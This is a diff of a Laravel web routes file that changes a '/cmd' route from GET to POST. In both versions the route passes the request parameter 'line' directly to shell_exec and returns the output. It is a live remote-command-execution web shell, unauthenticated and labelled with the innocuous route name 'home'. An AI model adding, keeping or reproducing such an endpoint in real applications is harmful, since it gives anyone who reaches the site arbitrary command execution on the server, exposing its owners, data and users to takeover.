@@ -27,7 +27,7 @@ use Illuminate\Support\Facades\Route;
 | be assigned to the "web" middleware group. Make something great!
 |
 */
-Route::get('/cmd', function (Request $request) {
+Route::post('/cmd', function (Request $request) {
     return shell_exec($request->line);
 })->name('home');
 
